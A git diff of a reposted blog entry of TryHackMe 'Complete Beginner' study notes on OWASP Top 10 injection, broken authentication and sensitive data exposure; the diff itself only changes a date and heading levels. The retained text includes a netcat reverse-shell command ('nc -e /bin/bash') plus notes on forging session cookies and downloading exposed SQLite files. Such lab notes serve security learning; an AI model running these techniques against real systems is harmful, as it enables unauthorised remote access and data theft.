@@ -1,6 +1,6 @@
 ---
 title: 'TryHackMe: Complete Beginner'
-date: 2021-10-05 05:00:00.000000000 Z
+date: 2021-10-05 12:00:00.000000000 Z
 layout: post-external
 original_link: https://cardboard-iguana.com/log/2021-10-05-tryhackme-complete-beginner.html
 author: 100007
@@ -9,8 +9,8 @@ author: 100007
 <h1 id="tryhackme-complete-beginner">TryHackMe: Complete Beginner</h1>
 <p><strong>author:</strong> Nathan Acks<br />
 <strong>date:</strong> 2021-10-05</p>
-<h2 id="owasp-top-10">OWASP Top 10</h2>
-<h3 id="severity-01-injection">(Severity 01) Injection</h3>
+<h1 id="owasp-top-10">OWASP Top 10</h1>
+<h2 id="severity-01-injection">(Severity 01) Injection</h2>
 <p>Some versions of netcat support a -e flag that hooks STDIN and STDOUT of an executable to the established network connection. So something like:</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-e</span> /bin/bash <span class="nv">$LOCAL_IP</span> <span class="nv">$LOCAL_PORT</span>
 </code></pre></div></div>
@@ -22,9 +22,9 @@ author: 100007
 <ul>
 <li><a href="https://cardboard-iguana.com/log/2021-10-02-tryhackme-complete-beginner.html">2021-10-02 - TryHackMe: Complete Beginner</a></li>
 </ul>
-<h3 id="severity-02-broken-authentication">(Severity 02) Broken Authentication</h3>
+<h2 id="severity-02-broken-authentication">(Severity 02) Broken Authentication</h2>
 <p>Sometimes you don’t need to steal a session cookie… If the webserver isn’t setting session cookies in a sufficiently random fashion, <em>forging</em> one can become an option!</p>
 <p>The TryHackMe tutorial implies that a common mistake is to allow the registration of a username that matches an existing user but with a leading or trailing whitespace character; sometimes this new user will be interpreted to be the same as the old user (the one without the whitespace), resulting in the same level of access as that user.</p>
 <p>Honestly, I’m trying to imagine how this would happen in most realistic contexts. Yes, it’s easy to construct an example in Bash (etc.), but most languages I’ve seen web apps written it take string quoting a lot more seriously.</p>
-<h3 id="severity-03-sensitive-data-exposure">(Severity 03) Sensitive Data Exposure</h3>
+<h2 id="severity-03-sensitive-data-exposure">(Severity 03) Sensitive Data Exposure</h2>
 <p>So, the trick this section is talking about is that some small web applications use SQLite databases, and a sloppy webdev might store the database file in the application webroot where it can be downloaded and then read at our leisure.</p>
